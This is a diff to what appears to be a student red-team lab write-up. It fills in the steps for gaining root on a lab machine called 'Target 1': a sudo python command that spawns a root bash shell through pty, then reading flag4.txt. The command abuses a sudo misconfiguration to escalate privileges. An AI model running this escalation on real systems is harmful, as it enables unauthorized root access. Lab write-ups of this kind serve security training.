@@ -121,11 +121,13 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 ![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/sshsteven.png)
 
 - Use Python to gain root privileges
-    - `
-    - `
-    - `
-    - `
-    - `
+    - `ls`
+    - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
+    - `cd ~`
+    - `ls`
+    - `cat flag4.txt`
+
+![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/Python.png)
 
 
 
